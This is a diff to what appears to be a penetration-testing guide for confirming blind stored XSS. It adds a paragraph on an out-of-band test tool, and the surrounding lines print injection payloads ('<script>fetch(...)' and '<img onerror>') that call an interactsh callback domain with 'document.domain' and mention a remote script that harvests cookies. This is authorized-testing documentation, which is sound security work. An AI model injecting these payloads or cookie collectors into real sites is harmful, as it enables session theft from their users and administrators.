@@ -245,6 +245,8 @@ The remote `x.js` does the real work: harvest `document.cookie`, `document.domai
 
 For confirmation-only (no cookie/DOM-capture infrastructure available), a single OOB callback is enough to prove execution: mint a domain with `interactsh-client -v` and inject `<script>fetch('https://xyz.oast.fun/hit')</script>` or `<img src=x onerror="fetch('//xyz.oast.fun/'+document.domain)">` — the DNS/HTTP hit on interactsh's stdout, arriving asynchronously after the stored payload is viewed, is the proof of execution in someone else's browser. Full harvesting (cookies, screenshots, DOM) needs a purpose-built collector (self-hosted XSS-Hunter-style) when authorized and in scope.
 
+The deterministic path for that confirmation-only case is **`run_oob_test` with `vuln_category="xss"`** (per `analysis/parameter_mutation_testing.md`/the OOB executor): it allocates a unique interactsh canary, injects a blind-XSS `<script src=…>`/`<img onerror>` payload (override the shape for the context via `payload_template`), and correlates a callback to that exact canary — recording the attempt on the hypothesis worklist. Because a stored-XSS fire is **second-order** (it happens when a victim/admin next renders the value, often long after the tool's poll window), a `no_callback_this_run` result stays `testing`, never `ruled_out`: the canary host is recorded so a delayed hit is still attributable on a later re-check. Use the manual x.js collector above instead when you need cookie/DOM/screenshot harvesting rather than a bare execution proof.
+
 ### Confirming and Reporting
 
 - The finding is **not** confirmed at injection time — only when the callback fires. Wait a realistic review window (minutes to days, depending on the target's ticket/moderation SLA) before closing it out.
